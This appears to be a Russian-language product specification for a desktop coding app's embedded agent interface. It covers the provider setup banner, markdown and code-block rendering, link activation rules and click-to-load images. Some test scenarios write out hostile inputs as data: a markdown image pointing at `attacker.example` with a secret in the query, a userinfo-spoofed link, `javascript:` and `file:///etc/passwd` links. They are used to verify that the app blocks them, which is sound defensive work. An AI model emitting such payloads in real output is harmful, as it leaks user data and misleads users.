Если встроенный агент не открылся только потому, что нет ни одного провайдера с моделью (`providerSetupNeeded` моста `codelab_setup` истинно для снимка конфига, с которым он открывался: нет файла, нет провайдеров или у них нет моделей; spec client-agent-setup «Готовность провайдера»; без `agent.default_model` при провайдере с моделью агент открывается на первой модели, design.md change `optional-default-model`, D3), баннер соединения SHALL показывать `No model provider is configured for the embedded agent.` и действие «Add provider» (ключ `connection-banner-add-provider`) вместо сырого текста проблем (решение пользователя 2026-11-06; design.md change `add-provider-setup-ui`, D26). Признак SHALL определяться по типизированным проблемам загрузчика и составу слоёв конфига, а не по тексту. Прочие ошибки конфига встроенного агента SHALL показываться как раньше.

«Add provider» SHALL открывать мастер провайдера (spec app-settings «Мастер провайдера в app») с целью `user` по умолчанию и неснимаемым «Make default». После `ConfigSaved` app SHALL переподключать встроенного агента, если с момента сбоя не начиналась новая попытка подключения окна; если началась (к любому профилю), переподключения НЕ SHALL быть. Отмена мастера SHALL оставлять баннер.

#### Scenario: Новая установка
- **WHEN** app с пустым `CODELAB_HOME` подключается к встроенному агенту
- **THEN** баннер показывает `No model provider is configured for the embedded agent.` и «Add provider», текста `no model is configured` (сырая проблема `config.model.none`, design.md change `optional-default-model`, D4) и `codelab config check` в нём нет

#### Scenario: Провайдер добавлен из баннера
- **WHEN** пользователь нажимает «Add provider» в баннере, проходит мастер и сохраняет провайдера
- **THEN** `config.yaml` содержит провайдера и `agent.default_model` (мастер с неснимаемым «Make default» пишет ключ, D7; для старта агента ключ не обязателен), app переподключает встроенного агента, баннер исчезает, а модель видна в селекторе композера

#### Scenario: Другой профиль за время мастера
- **WHEN** мастер открыт из баннера, и пока он открыт, окно начинает подключение к stdio-профилю (диалог модальный, поэтому тест начинает попытку через `ConnectionCommands.connect`), затем пользователь сохраняет провайдера
- **THEN** конфиг записан, переподключения к встроенному агенту нет, окно остаётся подключённым к stdio-профилю, журнал содержит `provider_wizard.reconnect_skipped`

#### Scenario: Прочая ошибка конфига
- **WHEN** `config.yaml` задаёт провайдера и `agent.default_model`, но содержит `budget.max_steps: 0`; либо задаёт провайдера `gw` и `agent.default_model: gw/typo`, которой нет в каталоге
- **THEN** баннер показывает прежний текст проблемы с подсказкой `codelab config check`, действия «Add provider» нет

### Requirement: Тег неизвестного риска одобрения
Строка вызова с ждущим одобрением SHALL показывать для клиентского уровня риска `unknown` тег `Unknown risk` тоном предупреждения, дополняя набор тегов требования «Tool call as a one-line row» (решение пользователя 2026-11-08, design.md change `add-provider-setup-ui`, Q32, D27).

#### Scenario: MCP-инструмент с подсказкой «только чтение»
- **WHEN** встроенный агент запрашивает разрешение на вызов MCP-инструмента, сервер которого объявил `readOnlyHint: true`
- **THEN** строка вызова показывает подпись по имени инструмента и тег `Unknown risk`, а не `Read` и `Read-only`

### Requirement: Заметка исхода хода в ленте
Лента SHALL показывать `NoticeItem` вида `turnStopped` (spec acp-client-kit «Инкрементальная проекция транскрипта») строкой заметки после вывода хода, тем же видом, что заметку `emptyTurn` (design.md change `add-provider-setup-ui`, Q33, D27).

#### Scenario: Молчаливый max_tokens
- **WHEN** ход встроенного агента после размышлений завершается с `stopReason: max_tokens`
- **THEN** лента показывает под размышлениями строку `The model reached its token limit, so the turn ended.`

### Requirement: Ответ агента одним огороженным блоком
Если весь текст ответа агента (`AgentTextItem`) без пробельных строк по краям — ровно один огороженный блок markdown, лента SHALL показывать его блоком кода по требованию «Блок кода в ответе агента»: без строк ограждения, с подписью языка, кнопкой «Copy», сохранением переводов строк и возможностью выделить текст; язык `text` не подсвечивается. Пока ход идёт и закрывающей строки ещё нет, содержимое SHALL показываться моноширинным блоком кода без подсветки, а не сырым текстом (DSK-6). Проза до или после блока и несколько блоков SHALL показываться как markdown (требование «Markdown в ответе агента»). Правило панели «Agent status» (spec app-settings, сценарий «Ответ /mcp list без внешнего ограждения») не меняется (решение пользователя 2026-11-11, design.md change `add-desktop-markdown`, D11; прежнее решение — Q37, D27 change `add-provider-setup-ui`).

#### Scenario: Ответ /mcp list в ленте
- **WHEN** встроенный агент отвечает на `/mcp list` текстом ```` ```text\nMCP servers (1)\n…\n``` ````
- **THEN** лента показывает строки `MCP servers (1)` и таблицу моноширинным блоком кода с подписью `text` и кнопкой «Copy», строк ```` ```text ```` и ```` ``` ```` нет

#### Scenario: Текст вокруг блока
- **WHEN** ответ агента содержит прозу до или после огороженного блока или два блока
- **THEN** лента показывает прозу как markdown, а каждый огороженный блок — блоком кода

#### Scenario: Открывающая строка во время хода
- **WHEN** ход идёт, и ответ пока состоит из строки ```` ```text ```` и одной строки вывода
- **THEN** лента показывает строку вывода моноширинным блоком без подсветки, строки ```` ```text ```` нет

### Requirement: Вызов смены режима и неизвестного вида в ленте
Строка вызова вида `switch_mode` SHALL показывать метку `Mode` и деталь из `ToolRowView` (требование «Строка инструмента без сырого JSON» acp-client-kit). Строка вызова, чей строковый `kind` CodeLab не знает, SHALL выглядеть как строка вызова вида `other`. Пока у такого вызова ждёт одобрение, строка SHALL показывать тег `Unknown risk` (требование «Тег неизвестного риска одобрения», change `add-provider-setup-ui`) и варианты агента без изменений. Строка SHALL NOT показывать wire-имя вида (`switch_mode`, исходное незнакомое значение) (design.md change `tolerate-unknown-tool-kind`, D5, D7).

#### Scenario: Выход из plan-режима ждёт одобрения
- **WHEN** агент запрашивает разрешение на вызов `switch_mode` с `title` "Ready for implementation" и вариантами «Yes, and auto-accept all actions», «Yes, and manually accept actions», «No, stay in architect mode»
- **THEN** строка вызова читается «Mode Ready for implementation», показывает тег `Unknown risk`, раскрыта с панелью решения из трёх вариантов агента и не содержит `switch_mode`

#### Scenario: Вызов незнакомого вида ждёт одобрения
- **WHEN** агент запрашивает разрешение на вызов, которого ещё нет в ходе, с `kind: "future_kind"` и `title` "Plan sync"
- **THEN** строка вызова читается «Plan sync» с тегом `Unknown risk` и не содержит `future_kind`

### Requirement: Markdown в ответе агента
Лента SHALL рисовать текст ответа агента (`AgentTextItem.text`) как markdown без сырых маркеров разметки: заголовки, абзацы с курсивом, жирным, зачёркнутым и inline-кодом, маркированные и нумерованные списки с вложенностью, списки задач с неинтерактивным флажком Fluent, цитаты, таблицы, горизонтальная черта, блоки кода (требование «Блок кода в ответе агента») и формулы в `\(…\)` и `\[…\]`. Знак `$` SHALL оставаться обычным символом. Разбор SHALL выполнять пакет `gpt_markdown` внутри `codelab_ui` (`lib/src/rendering/`) со своими builder'ами и темой из `FluentTheme`, без Material-предка; ядро клиента и app НЕ SHALL разбирать markdown сами. HTML-теги SHALL показываться текстом как написаны и НЕ SHALL становиться элементами разметки, изображениями или ссылками. Цвета SHALL браться только из `FluentTheme`, тонов кита и палитры подсветки (DSK-19). Текст ответа SHALL выделяться мышью в пределах ответа без Material-предка и копироваться Cmd/Ctrl+C; по правому клику SHALL открываться меню Fluent с пунктами «Copy» и «Select all»; ответ НЕ SHALL быть остановкой обхода Tab. Если оценка глубины вложенности хотя бы одной строки ответа — все символы `>` строки, плюс все маркеры списка в любом месте строки, плюс половина колонок пробельных серий ведущего префикса из пробелов, табов (4 колонки), `>` и маркеров списка; строки делятся по `\n`, `\r`, U+2028, U+2029 и U+0085 и считаются в том числе внутри оград — больше предела (`kMaxMarkdownNestingDepth`, 32), ответ SHALL показываться моноширинным простым текстом с пометкой `Shown as plain text: nesting is too deep.` без разбора, и строка НЕ SHALL падать при пересборке. Промпт пользователя и мысли модели SHALL показываться как есть, без разметки (design.md change `add-desktop-markdown`, D1–D4, D7–D9, D14).

#### Scenario: Ответ со smoke без сырых маркеров
- **WHEN** агент отвечает текстом, где «Готово.» обрамлено `**`, `dart test` в строке обрамлено обратными кавычками, а ниже идёт огороженный блок с языком `bash` и строкой `dart test`
- **THEN** лента показывает «Готово.» жирным, `dart test` в строке — inline-кодом, команду — блоком кода с подписью `bash`, а символов `**`, `` ` `` и строк ```` ``` ```` в ленте нет

#### Scenario: Разметка в теме Fluent без Material
- **WHEN** выполняется `acp_markdown_test.dart: renders headings lists tables quotes and inline code` в светлой и тёмной теме Fluent без Material-предка, с заголовками, вложенным списком, списком задач `[ ]`/`[x]`, таблицей и цитатой
- **THEN** исключений нет, заголовки имеют разные стили, задача `[x]` показана отмеченным Fluent `Checkbox` без реакции на клик, таблица и цитата отрисованы, цвета блока кода в тёмной теме — из тёмной палитры

#### Scenario: HTML показывается текстом
- **WHEN** ответ содержит `<b>bold</b>` и `<img src="https://x.example/y.png">`
- **THEN** лента показывает обе строки текстом как написаны, жирного начертания и изображения нет, сетевых запросов нет

#### Scenario: Доллар не формула
- **WHEN** ответ содержит `стоит $5, а $HOME — переменная` и `\(a^2\)`
- **THEN** первая строка показана текстом с символами `$`, а `\(a^2\)` — формулой

#### Scenario: Выделение и меню без Material
- **WHEN** пользователь выделяет мышью часть ответа, нажимает Cmd/Ctrl+C, затем делает правый клик по ответу
- **THEN** буфер содержит выделенный текст без подписи языка блока кода, меню Fluent содержит «Copy» и «Select all», а клавиша Tab из предыдущего элемента ленты переходит мимо ответа

#### Scenario: Глубоко вложенный ответ показывается текстом
- **WHEN** агент отвечает текстом `'> ' * 1000 + 'x'` (около 2 КБ), или одной строкой из 1000 маркеров списка `- - - … x`, или такой строкой внутри огороженного блока, или цитатой глубины 1000, где строки разделены одиночным `\r` или начинаются с U+FEFF, или 600 строками вида `>` + `i` табов + `- x`
- **THEN** в каждом случае лента показывает этот текст моноширинным блоком с пометкой `Shown as plain text: nesting is too deep.`, исключений нет ни при первой сборке, ни после прокрутки строки с экрана и обратно, а остальные строки ленты размечены как обычно

#### Scenario: Мысли без разметки
- **WHEN** агент стримит мысль `**plan**: read files`, затем ответ `**done**`
- **THEN** блок мыслей показывает `**plan**: read files` как есть, а ответ — «done» жирным

### Requirement: Блок кода в ответе агента
Блок кода ответа SHALL показывать подпись языка из info-строки ограды (без языка — без подписи) вне выделения текста, код моноширинным шрифтом с сохранением переводов строк и кнопку «Copy», которая кладёт в буфер обмена исходный код блока без строк ограды. Код SHALL подсвечиваться по языку info-строки из зарегистрированного набора своей палитрой из ролей `FluentTheme` с контрастом каждого класса токена не ниже 4,5:1 на фоне блока в светлой и тёмной теме; неизвестный язык или его отсутствие SHALL давать код без подсветки, без автоопределения. Токенизация кода до 300 строк и 16 КиБ MAY выполняться синхронно; код больше этого НЕ SHALL токенизироваться в UI isolate, а до готовности токенов SHALL показываться без цвета; код больше 5000 строк или 256 Ki code units НЕ SHALL подсвечиваться (DSK-5). Код со строкой длиннее 150 code units НЕ SHALL токенизироваться в UI isolate, со строкой длиннее 1000 code units НЕ SHALL подсвечиваться; фоновая токенизация SHALL прерываться через 5 с, и код остаётся без подсветки; повтор того же кода после таймаута или сбоя НЕ SHALL запускать токенизацию заново. Сбой токенизации SHALL оставлять код без подсветки и SHALL сообщаться как ошибка Flutter без текста кода (design.md change `add-desktop-markdown`, D4).

#### Scenario: Язык и копирование
- **WHEN** выполняется `acp_markdown_test.dart: code block shows language and copy puts raw code into clipboard` для блока ```` ```dart ```` с двумя строками
- **THEN** блок показывает подпись `dart`, нажатие `code-copy-<rowId>-0` кладёт в буфер ровно две строки кода без ```` ``` ````, а выделение всего ответа не содержит подписи `dart`; второй блок с тем же кодом в том же ответе имеет ключ `code-copy-<rowId>-1`

#### Scenario: Большой блок подсвечивается вне UI isolate
- **WHEN** выполняется `acp_markdown_test.dart: large code block is highlighted off the UI isolate` для блока `dart` из 1000 строк
- **THEN** `highlightSyncRuns` равен 0, до результата код показан без цвета, после результата строка перерисована один раз

#### Scenario: Неизвестный язык
- **WHEN** блок кода имеет язык `foolang`
- **THEN** код показан моноширинно без подсветки, подпись `foolang` видна, «Copy» работает

### Requirement: Стриминг markdown без перестройки закрытых блоков
Пока ответ стримится, лента SHALL перестраивать только незакрытый хвост ответа: закрытый блок SHALL строиться не больше одного раза за время стрима, и обновление хвоста НЕ SHALL перестраивать закрытые блоки и другие строки ленты (DSK-3). Тема и builder'ы отрисовки SHALL создаваться один раз на тему Fluent и переиспользоваться между сборками. Незакрытая ограда в хвосте SHALL рисоваться моноширинным текстом без подсветки; подсветка SHALL запускаться только для закрытой ограды (DSK-6). Следование за хвостом и автопрокрутка к одобрению SHALL работать как раньше (требование «Лента transcript следует за хвостом») (design.md change `add-desktop-markdown`, D3).

#### Scenario: 200 дельт
- **WHEN** выполняется `acp_markdown_test.dart: streaming 200 chunks builds each closed block once` для ответа с заголовками и тремя блоками кода
- **THEN** после всех 200 обновлений `codeBlockBuilds` каждого закрытого блока кода и `headingBuilds` каждого заголовка равны 1

#### Scenario: Длинный ответ
- **WHEN** тот же тест выполняется для ответа 48 КБ
- **THEN** первый блок кода смонтирован и построен один раз, подсветка для него запускалась не больше одного раза

#### Scenario: Ограда закрывается во время стрима
- **WHEN** выполняется `acp_markdown_test.dart: unclosed fence in tail renders plain and highlights after close`: пришли строки ```` ```dart ```` и `final a = 1;`, затем закрывающая ограда
- **THEN** до закрывающей ограды код показан моноширинно без подсветки и без `highlightRuns`, после неё блок подсвечен, а абзац перед блоком не перестраивался

### Requirement: Ссылки в ответе агента
Ссылка в ответе SHALL быть активной, только если её адрес имеет схему `http` или `https` с непустым хостом либо `mailto` с непустым адресом, и в адресе нет userinfo (`https://good.com@evil.com` — обычный текст); решение об активности SHALL принимать app и передавать ленте. Активная ссылка SHALL переноситься вместе с абзацем. `mailto` SHALL быть активной, только если каждый адресат из пути после раскодирования — простой `local@domain` без `?`, `&`, `%`, пробелов, CR и LF. При открытии `mailto` SHALL сохраняться только адресаты из пути и `subject` (с битым `%`-escape `subject` отбрасывается); `cc`, `bcc`, `body`, `attach` и прочие параметры SHALL отбрасываться. Адреса локальной сети SHALL обрабатываться как любые другие (риск принят пользователем 2026-11-11). Активная ссылка SHALL показываться подчёркнутой акцентным цветом с полным адресом во всплывающей подсказке (управляющие символы и символы направления текста — видимыми escape-последовательностями) и SHALL открываться внешним приложением по клику пользователя через порт платформы, который повторно проверяет схему. Ссылки с другими схемами (`file:`, `javascript:`, `data:`, `vscode:`, `xmpp:` и прочие), protocol-relative адреса и относительные пути SHALL показываться обычным текстом и НЕ SHALL открываться. Ссылка НЕ SHALL открываться без клика пользователя (DSK-7). Журнал открытия SHALL содержать схему, хост и исход и НЕ SHALL содержать путь, query и fragment (design.md change `add-desktop-markdown`, D5, D12).

#### Scenario: Ссылка https открывается по клику
- **WHEN** выполняется `acp_markdown_test.dart: link tap calls onOpenLink and non-http schemes are not tappable` для `[docs](https://example.com/a?token=abc)`, а в app пользователь кликает по `docs`
- **THEN** подсказка показывает `https://example.com/a?token=abc`, порт открывает адрес один раз, в журнале есть `scheme=https`, `host=example.com` и нет `token=abc`

#### Scenario: Userinfo и mailto
- **WHEN** ответ содержит `[a](https://good.com@evil.com/x)` и `[m](mailto:a@b.example?subject=Hi&cc=c@d.example&body=text)`, и пользователь кликает по `m`
- **THEN** `a` показана обычным текстом без реакции на клик, а порт открывает `mailto:a@b.example?subject=Hi` без `cc` и `body`

#### Scenario: Опасные схемы не открываются
- **WHEN** ответ содержит `[x](javascript:alert(1))`, `[f](file:///etc/passwd)`, `[d](data:text/html,hi)`, `[v](vscode://open)`, `[p](//evil.example/a)` и `<xmpp:a@b>`
- **THEN** каждая из них показана обычным текстом без подчёркивания, клик не вызывает порт открытия ссылок

### Requirement: Изображения в ответе агента
Изображение из ответа агента НЕ SHALL загружаться без явного действия пользователя: по умолчанию лента SHALL показывать заглушку с подписью «Image», хостом и именем файла, с полным адресом в подсказке. Кнопка «Show image» SHALL показываться только для адреса со схемой `https`, непустым хостом и без userinfo; загрузка SHALL ограничиваться телом 32 МБ, таймаутами 10 с на соединение и 30 с на загрузку и размером декодирования 1440×1440, а картинка с размерами из заголовка больше 40 млн пикселей или стороной больше 16 384 SHALL отклоняться до декодирования, редирект на адрес, не прошедший ту же проверку (в том числе на `http`), НЕ SHALL приниматься; изображение SHALL загружаться только после нажатия этой кнопки. Для `http`, `data:`, `file:` и относительных адресов SHALL оставаться заглушка без кнопки. Выбор пользователя SHALL относиться к одной строке ленты и одному адресу, SHALL переживать уход строки с экрана и НЕ SHALL сохраняться между запусками. Ни отрисовка markdown, ни HTML ответа НЕ SHALL выполнять сетевых запросов до нажатия (VIEW-12, DSK-7; design.md change `add-desktop-markdown`, D6).

#### Scenario: Нет запросов до клика
- **WHEN** выполняется `acp_markdown_test.dart: markdown image is not fetched before user action` для `![](https://attacker.example/?d=secret)` и `![p](https://x.example/p.svg)` с перехватом сети
- **THEN** сетевых запросов нет, обе картинки показаны заглушками с хостом и кнопкой «Show image»

#### Scenario: Загрузка по клику
- **WHEN** пользователь нажимает «Show image» у `https://x.example/y.png`, прокручивает ленту так, что строка уходит с экрана, и возвращается
- **THEN** изображение запрошено один раз и показано, после возврата оно по-прежнему показано

#### Scenario: Небезопасный адрес изображения
- **WHEN** ответ содержит `![a](http://x.example/y.png)` и `![b](data:image/png;base64,AAAA)`
- **THEN** обе картинки показаны заглушками без кнопки «Show image», сетевых запросов нет

